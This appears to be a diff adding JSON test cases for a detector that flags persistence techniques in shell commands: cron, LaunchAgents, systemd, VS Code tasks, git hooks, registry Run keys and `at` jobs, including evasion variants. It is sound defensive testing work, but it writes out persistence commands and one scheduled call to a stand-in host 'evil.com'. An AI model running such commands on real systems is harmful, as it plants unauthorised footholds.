+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-tab-ws",
+  "command": "crontab\t-e",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-vertical-ws",
+  "command": "crontab\u001c-e",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-nbsp",
+  "command": "crontab\u00a0-e",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-e-suffix",
+  "command": "crontab -editor",
+  "expected": []
+ },
+ {
+  "name": "cron-echo-far",
+  "command": "echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa > /var/spool/cron/root",
+  "expected": []
+ },
+ {
+  "name": "cron-echo-quote-tail",
+  "command": "echo x > /etc/cron.d/a'b",
+  "expected": [
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "cron-tab-dash-x",
+  "command": "crontab -x",
+  "expected": []
+ },
+ {
+  "name": "launch-user",
+  "command": "cp evil.plist ~/Library/LaunchAgents/com.evil.agent.plist",
+  "expected": [
+   {
+    "mechanism": "launch_agent_write",
+    "plain_reason": "Command installs a macOS Launch Agent or Daemon, which runs automatically on login or boot.",
+    "false_positive_hint": "Allow if this is installing a known legitimate background service."
+   }
+  ]
+ },
+ {
+  "name": "launch-sys",
+  "command": "cp x.plist /Library/LaunchAgents/com.x.plist",
+  "expected": [
+   {
+    "mechanism": "launch_agent_write",
+    "plain_reason": "Command installs a macOS Launch Agent or Daemon, which runs automatically on login or boot.",
+    "false_positive_hint": "Allow if this is installing a known legitimate background service."
+   }
+  ]
+ },
+ {
+  "name": "launch-daemons",
+  "command": "cp x.plist /Library/LaunchDaemons/com.x.plist",
+  "expected": [
+   {
+    "mechanism": "launch_agent_write",
+    "plain_reason": "Command installs a macOS Launch Agent or Daemon, which runs automatically on login or boot.",
+    "false_positive_hint": "Allow if this is installing a known legitimate background service."
+   }
+  ]
+ },
+ {
+  "name": "launch-system-agents",
+  "command": "cp x.plist /System/Library/LaunchAgents/com.x.plist",
+  "expected": [
+   {
+    "mechanism": "launch_agent_write",
+    "plain_reason": "Command installs a macOS Launch Agent or Daemon, which runs automatically on login or boot.",
+    "false_positive_hint": "Allow if this is installing a known legitimate background service."
+   }
+  ]
+ },
+ {
+  "name": "launch-system-daemons",
+  "command": "cp x.plist /System/Library/LaunchDaemons/com.x.plist",
+  "expected": [
+   {
+    "mechanism": "launch_agent_write",
+    "plain_reason": "Command installs a macOS Launch Agent or Daemon, which runs automatically on login or boot.",
+    "false_positive_hint": "Allow if this is installing a known legitimate background service."
+   }
+  ]
+ },
+ {
+  "name": "launch-read-only",
+  "command": "cat ~/Library/LaunchAgents/com.evil.plist",
+  "expected": []
+ },
+ {
+  "name": "launch-short-name",
+  "command": "cp x ~/Library/LaunchAgents/a.plist",
+  "expected": []
+ },
+ {
+  "name": "launch-3chars",
+  "command": "cp x ~/Library/LaunchAgents/ab.plist",
+  "expected": []
+ },
+ {
+  "name": "launch-4chars",
+  "command": "cp x ~/Library/LaunchAgents/abc.plist",
+  "expected": [
+   {
+    "mechanism": "launch_agent_write",
+    "plain_reason": "Command installs a macOS Launch Agent or Daemon, which runs automatically on login or boot.",
+    "false_positive_hint": "Allow if this is installing a known legitimate background service."
+   }
+  ]
+ },
+ {
+  "name": "launch-case",
+  "command": "CP X ~/LIBRARY/LAUNCHAGENTS/COM.EVIL.PLIST",
+  "expected": [
+   {
+    "mechanism": "launch_agent_write",
+    "plain_reason": "Command installs a macOS Launch Agent or Daemon, which runs automatically on login or boot.",
+    "false_positive_hint": "Allow if this is installing a known legitimate background service."
+   }
+  ]
+ },
+ {
+  "name": "launch-prefixed",
+  "command": "cp x foo~/Library/LaunchAgents/com.evil.plist",
+  "expected": [
+   {
+    "mechanism": "launch_agent_write",
+    "plain_reason": "Command installs a macOS Launch Agent or Daemon, which runs automatically on login or boot.",
+    "false_positive_hint": "Allow if this is installing a known legitimate background service."
+   }
+  ]
+ },
+ {
+  "name": "launch-redirect",
+  "command": "echo '<plist/>' > ~/Library/LaunchAgents/com.evil.plist",
+  "expected": [
+   {
+    "mechanism": "launch_agent_write",
+    "plain_reason": "Command installs a macOS Launch Agent or Daemon, which runs automatically on login or boot.",
+    "false_positive_hint": "Allow if this is installing a known legitimate background service."
+   }
+  ]
+ },
+ {
+  "name": "launch-no-plist",
+  "command": "cp x ~/Library/LaunchAgents/com.evil",
+  "expected": []
+ },
+ {
+  "name": "launch-plist-suffix",
+  "command": "cp x ~/Library/LaunchAgents/com.evil.plistx",
+  "expected": []
+ },
+ {
+  "name": "launch-launchctl-only",
+  "command": "launchctl load ~/Library/LaunchAgents",
+  "expected": []
+ },
+ {
+  "name": "launch-quote-stop",
+  "command": "cp x '~/Library/LaunchAgents/a b.plist'",
+  "expected": []
+ },
+ {
+  "name": "systemd-etc",
+  "command": "cp evil.service /etc/systemd/system/evil.service",
+  "expected": [
+   {
+    "mechanism": "systemd_unit_write",
+    "plain_reason": "Command installs a systemd service unit, which can run automatically at boot or login.",
+    "false_positive_hint": "Allow if this is installing a known legitimate system service."
+   }
+  ]
+ },
+ {
+  "name": "systemd-usr-lib",
+  "command": "cp e.timer /usr/lib/systemd/system/e.timer",
+  "expected": []
+ },
+ {
+  "name": "systemd-run",
+  "command": "cp e.socket /run/systemd/system/e.socket",
+  "expected": []
+ },
+ {
+  "name": "systemd-user-tilde",
+  "command": "cp e.path ~/.config/systemd/user/e.path",
+  "expected": []
+ },
+ {
+  "name": "systemd-user-home-dir",
+  "command": "cp e.mount /home/bob/.config/systemd/user/e.mount",
+  "expected": []
+ },
+ {
+  "name": "systemd-user-home-var",
+  "command": "cp e.target $HOME/.config/systemd/user/e.target",
+  "expected": []
+ },
+ {
+  "name": "systemd-user-absolute",
+  "command": "cp e.service /.config/systemd/user/e.service",
+  "expected": []
+ },
+ {
+  "name": "systemd-read",
+  "command": "cat /etc/systemd/system/evil.service",
+  "expected": []
+ },
+ {
+  "name": "systemd-short",
+  "command": "cp x /etc/systemd/system/a.service",
+  "expected": []
+ },
+ {
+  "name": "systemd-no-ext",
+  "command": "cp x /etc/systemd/system/evil.conf",
+  "expected": []
+ },
+ {
+  "name": "systemd-upper",
+  "command": "CP X /ETC/SYSTEMD/SYSTEM/EVIL.SERVICE",
+  "expected": [
+   {
+    "mechanism": "systemd_unit_write",
+    "plain_reason": "Command installs a systemd service unit, which can run automatically at boot or login.",
+    "false_positive_hint": "Allow if this is installing a known legitimate system service."
+   }
+  ]
+ },
+ {
+  "name": "systemd-tee",
+  "command": "echo '[Unit]' | tee /etc/systemd/system/x1.service",
+  "expected": []
+ },
+ {
+  "name": "systemd-ext-suffix",
+  "command": "cp x /etc/systemd/system/evil.servicex",
+  "expected": []
+ },
+ {
+  "name": "systemd-ext-dot",
+  "command": "cp x /etc/systemd/system/evil.service.bak",
+  "expected": []
+ },
+ {
+  "name": "systemd-home-nested",
+  "command": "cp x /home/a/b/.config/systemd/user/e.service",
+  "expected": []
+ },
+ {
+  "name": "vscode-tasks",
+  "command": "cp x .vscode/tasks.json",
+  "expected": [
+   {
+    "mechanism": "vscode_tasks_write",
+    "plain_reason": "Command modifies VS Code tasks or launch configuration, which run automatically in the IDE.",
+    "false_positive_hint": "Allow if this is setting up legitimate project build or debug tasks."
+   }
+  ]
+ },
+ {
+  "name": "vscode-launch",
+  "command": "cp x .vscode/launch.json",
+  "expected": [
+   {
+    "mechanism": "vscode_tasks_write",
+    "plain_reason": "Command modifies VS Code tasks or launch configuration, which run automatically in the IDE.",
+    "false_positive_hint": "Allow if this is setting up legitimate project build or debug tasks."
+   }
+  ]
+ },
+ {
+  "name": "vscode-settings",
+  "command": "cp x .vscode/settings.json",
+  "expected": [
+   {
+    "mechanism": "vscode_tasks_write",
+    "plain_reason": "Command modifies VS Code tasks or launch configuration, which run automatically in the IDE.",
+    "false_positive_hint": "Allow if this is setting up legitimate project build or debug tasks."
+   }
+  ]
+ },
+ {
+  "name": "vscode-redirect",
+  "command": "cat tasks.json > .vscode/tasks.json",
+  "expected": [
+   {
+    "mechanism": "vscode_tasks_write",
+    "plain_reason": "Command modifies VS Code tasks or launch configuration, which run automatically in the IDE.",
+    "false_positive_hint": "Allow if this is setting up legitimate project build or debug tasks."
+   }
+  ]
+ },
+ {
+  "name": "vscode-read",
+  "command": "cat .vscode/tasks.json",
+  "expected": []
+ },
+ {
+  "name": "vscode-jq-redirect",
+  "command": "jq . .vscode/settings.json > /tmp/out",
+  "expected": [
+   {
+    "mechanism": "vscode_tasks_write",
+    "plain_reason": "Command modifies VS Code tasks or launch configuration, which run automatically in the IDE.",
+    "false_positive_hint": "Allow if this is setting up legitimate project build or debug tasks."
+   }
+  ]
+ },
+ {
+  "name": "vscode-prefixed",
+  "command": "cp x my.vscode/tasks.json",
+  "expected": []
+ },
+ {
+  "name": "vscode-other",
+  "command": "cp x .vscode/extensions.json",
+  "expected": []
+ },
+ {
+  "name": "vscode-suffix",
+  "command": "cp x .vscode/tasks.jsonc",
+  "expected": []
+ },
+ {
+  "name": "vscode-upper",
+  "command": "CP X .VSCODE/TASKS.JSON",
+  "expected": [
+   {
+    "mechanism": "vscode_tasks_write",
+    "plain_reason": "Command modifies VS Code tasks or launch configuration, which run automatically in the IDE.",
+    "false_positive_hint": "Allow if this is setting up legitimate project build or debug tasks."
+   }
+  ]
+ },
+ {
+  "name": "vscode-sed-no-write",
+  "command": "sed s/a/b/ .vscode/tasks.json",
+  "expected": []
+ },
+ {
+  "name": "vscode-sed-i",
+  "command": "sed -i s/a/b/ .vscode/tasks.json",
+  "expected": []
+ },
+ {
+  "name": "reg-add",
+  "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d y",
+  "expected": [
+   {
+    "mechanism": "registry_write",
+    "plain_reason": "Command writes to the Windows Registry, which can configure autostart or persistent settings.",
+    "false_positive_hint": "Allow if this is a known legitimate software installer or configuration step."
+   }
+  ]
+ },
+ {
+  "name": "reg-import",
+  "command": "reg import evil.reg",
+  "expected": [
+   {
+    "mechanism": "registry_write",
+    "plain_reason": "Command writes to the Windows Registry, which can configure autostart or persistent settings.",
+    "false_positive_hint": "Allow if this is a known legitimate software installer or configuration step."
+   }
+  ]
+ },
+ {
+  "name": "reg-copy",
+  "command": "reg copy A B",
+  "expected": [
+   {
+    "mechanism": "registry_write",
+    "plain_reason": "Command writes to the Windows Registry, which can configure autostart or persistent settings.",
+    "false_positive_hint": "Allow if this is a known legitimate software installer or configuration step."
+   }
+  ]
+ },
+ {
+  "name": "reg-query",
+  "command": "reg query HKCU",
+  "expected": []
+ },
+ {
+  "name": "reg-delete",
+  "command": "reg delete HKCU\\x",
+  "expected": []
+ },
+ {
+  "name": "regini",
+  "command": "regini script.ini",
+  "expected": [
+   {
+    "mechanism": "registry_write",
+    "plain_reason": "Command writes to the Windows Registry, which can configure autostart or persistent settings.",
+    "false_positive_hint": "Allow if this is a known legitimate software installer or configuration step."
+   }
+  ]
+ },
+ {
+  "name": "reg-upper",
+  "command": "REG ADD x",
+  "expected": [
+   {
+    "mechanism": "registry_write",
+    "plain_reason": "Command writes to the Windows Registry, which can configure autostart or persistent settings.",
+    "false_positive_hint": "Allow if this is a known legitimate software installer or configuration step."
+   }
+  ]
+ },
+ {
+  "name": "reg-prefix",
+  "command": "foo.reg add x",
+  "expected": []
+ },
+ {
+  "name": "reg-after-semicolon",
+  "command": "dir;reg add x",
+  "expected": [
+   {
+    "mechanism": "registry_write",
+    "plain_reason": "Command writes to the Windows Registry, which can configure autostart or persistent settings.",
+    "false_positive_hint": "Allow if this is a known legitimate software installer or configuration step."
+   }
+  ]
+ },
+ {
+  "name": "reg-addendum",
+  "command": "reg addendum",
+  "expected": []
+ },
+ {
+  "name": "reg-powershell",
+  "command": "powershell New-ItemProperty -Path HKCU:\\Run",
+  "expected": []
+ },
+ {
+  "name": "regini-suffix",
+  "command": "reginix a",
+  "expected": []
+ },
+ {
+  "name": "reg-tab",
+  "command": "reg\tadd x",
+  "expected": [
+   {
+    "mechanism": "registry_write",
+    "plain_reason": "Command writes to the Windows Registry, which can configure autostart or persistent settings.",
+    "false_positive_hint": "Allow if this is a known legitimate software installer or configuration step."
+   }
+  ]
+ },
+ {
+  "name": "at-now",
+  "command": "at now",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-now-f",
+  "command": "at -f job.sh now",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-midnight",
+  "command": "at midnight -f malicious.sh",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-noon",
+  "command": "at noon",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-tomorrow",
+  "command": "at tomorrow",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-time",
+  "command": "at 5pm",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-time-colon",
+  "command": "at 10:30pm",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-time-colon-bare",
+  "command": "at 10:30",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-digit",
+  "command": "at 5",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-echo-pipe",
+  "command": "echo 'curl http://evil.com' | at now",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-printf-pipe",
+  "command": "printf 'x' | at 5pm",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-echo-pipe-bare",
+  "command": "echo x | at",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-echo-pipe-atq",
+  "command": "echo x | atq",
+  "expected": []
+ },
+ {
+  "name": "at-bare",
+  "command": "at",
+  "expected": []
+ },
+ {
+  "name": "at-list",
+  "command": "atq",
+  "expected": []
+ },
+ {
+  "name": "at-word",
+  "command": "cat file.txt",
+  "expected": []
+ },
+ {
+  "name": "at-sentence",
+  "command": "look at the time",
+  "expected": []
+ },
+ {
+  "name": "at-sentence-now",
+  "command": "echo look at now",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-after-pipe",
+  "command": "ls | at now",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-upper",
+  "command": "AT NOW",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-fullwidth-digit",
+  "command": "at \u0665pm",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-minutes-am",
+  "command": "at 9:15am",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-teatime",
+  "command": "at teatime",
+  "expected": []
+ },
+ {
+  "name": "at-next-week",
+  "command": "at now + 1 minute",
+  "expected": [
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "at-nowx",
+  "command": "at nowx",
+  "expected": []
+ },
+ {
+  "name": "multi-profile-cron",
+  "command": "echo x >> ~/.bashrc; crontab -e",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   },
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   }
+  ]
+ },
+ {
+  "name": "multi-all",
+  "command": "echo x >> ~/.bashrc; cp h .git/hooks/pre-commit; crontab -e; cp a ~/Library/LaunchAgents/com.evil.plist; cp s /etc/systemd/system/evil.service; cp t .vscode/tasks.json; reg add x; echo y | at now",
+  "expected": [
+   {
+    "mechanism": "shell_profile_write",
+    "plain_reason": "Command writes to a shell profile or startup file, which runs on every new terminal session.",
+    "false_positive_hint": "Allow if this is setting up a legitimate development environment or PATH entry."
+   },
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   },
+   {
+    "mechanism": "cron_write",
+    "plain_reason": "Command modifies scheduled tasks (cron), allowing code to run automatically at set times.",
+    "false_positive_hint": "Allow if this is setting up a legitimate periodic maintenance task."
+   },
+   {
+    "mechanism": "launch_agent_write",
+    "plain_reason": "Command installs a macOS Launch Agent or Daemon, which runs automatically on login or boot.",
+    "false_positive_hint": "Allow if this is installing a known legitimate background service."
+   },
+   {
+    "mechanism": "systemd_unit_write",
+    "plain_reason": "Command installs a systemd service unit, which can run automatically at boot or login.",
+    "false_positive_hint": "Allow if this is installing a known legitimate system service."
+   },
+   {
+    "mechanism": "vscode_tasks_write",
+    "plain_reason": "Command modifies VS Code tasks or launch configuration, which run automatically in the IDE.",
+    "false_positive_hint": "Allow if this is setting up legitimate project build or debug tasks."
+   },
+   {
+    "mechanism": "registry_write",
+    "plain_reason": "Command writes to the Windows Registry, which can configure autostart or persistent settings.",
+    "false_positive_hint": "Allow if this is a known legitimate software installer or configuration step."
+   },
+   {
+    "mechanism": "at_job_schedule",
+    "plain_reason": "Command schedules a one-time deferred job via `at`, which runs automatically at the specified time.",
+    "false_positive_hint": "Allow if this is scheduling a legitimate maintenance or notification task."
+   }
+  ]
+ },
+ {
+  "name": "multi-hook-vscode",
+  "command": "cp a .git/hooks/update && cp b .vscode/launch.json",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   },
+   {
+    "mechanism": "vscode_tasks_write",
+    "plain_reason": "Command modifies VS Code tasks or launch configuration, which run automatically in the IDE.",
+    "false_positive_hint": "Allow if this is setting up legitimate project build or debug tasks."
+   }
+  ]
+ },
+ {
+  "name": "benign-git",
+  "command": "git add src/main.py && git commit -m 'fix'",
+  "expected": []
+ },
+ {
+  "name": "benign-npm",
+  "command": "npm install && npm run build",
+  "expected": []
+ },
+ {
+  "name": "benign-rg",
+  "command": "rg 'TODO' src/",
+  "expected": []
+ },
+ {
+  "name": "benign-echo",
+  "command": "echo 'hello world'",
+  "expected": []
+ },
+ {
+  "name": "benign-empty",
+  "command": "",
+  "expected": []
+ },
+ {
+  "name": "benign-ws",
+  "command": "   ",
+  "expected": []
+ },
+ {
+  "name": "benign-unicode",
+  "command": "echo '\u3053\u3093\u306b\u3061\u306f'",
+  "expected": []
+ },
+ {
+  "name": "combining-mark-boundary",
+  "command": "cp x .git/hooks/pre-commit\u0301",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "combining-mark-before",
+  "command": "\u0301cp x .git/hooks/pre-commit",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "lookbehind-letter-unicode",
+  "command": "cp x \u00e9.git/hooks/pre-commit",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "lookbehind-mark",
+  "command": "cp x \u0301.git/hooks/pre-commit",
+  "expected": [
+   {
+    "mechanism": "git_hook_write",
+    "plain_reason": "Command installs or modifies a git hook, which runs automatically on git events.",
+    "false_positive_hint": "Allow if this is installing a project-standard code quality or signing hook."
+   }
+  ]
+ },
+ {
+  "name": "boundary-cp-unicode",
+  "command": "\u00e9cp x .vscode/tasks.json",
+  "expected": []
+ },
+ {
+  "name": "boundary-install-digit",
+  "command": "9install .vscode/tasks.json",
+  "expected": []
+ },
+ {
+  "name": "boundary-install-superscript",
+  "command": "\u00b2install .vscode/tasks.json",
+  "expected": []
+ },
+ {
+  "name": "boundary-install-mark",
+  "command": "\u0301install .vscode/tasks.json",
+  "expected": [
+   {
+    "mechanism": "vscode_tasks_write",
+    "plain_reason": "Command modifies VS Code tasks or launch configuration, which run automatically in the IDE.",
+    "false_positive_hint": "Allow if this is setting up legitimate project build or debug tasks."
+   }
+  ]
+ }
+]
